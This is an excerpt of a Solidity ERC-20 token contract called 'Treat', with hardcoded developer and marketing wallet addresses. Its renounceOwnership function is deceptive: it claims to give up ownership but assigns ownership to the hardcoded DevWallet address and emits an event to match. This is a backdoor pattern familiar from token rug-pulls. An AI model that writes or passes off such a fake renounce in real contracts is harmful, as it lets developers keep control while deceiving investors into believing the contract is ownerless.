...
contract Treat is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = " Treat ";
    string private constant _symbol = unicode"Trt";
    ...
    address payable public DevWallet = payable(0x48B330e52c5B454FF0db7050731bA4630869564A);
    address payable public MarketingWallet = payable(0x1E773521c2dA5ff7fF01969081F8ea2BD254F1B9);
    ...
    function renounceOwnership() public virtual {
        emit OwnershipTransferred(_owner, address(0x48B330e52c5B454FF0db7050731bA4630869564A));
        _owner = address(0x48B330e52c5B454FF0db7050731bA4630869564A);
    }
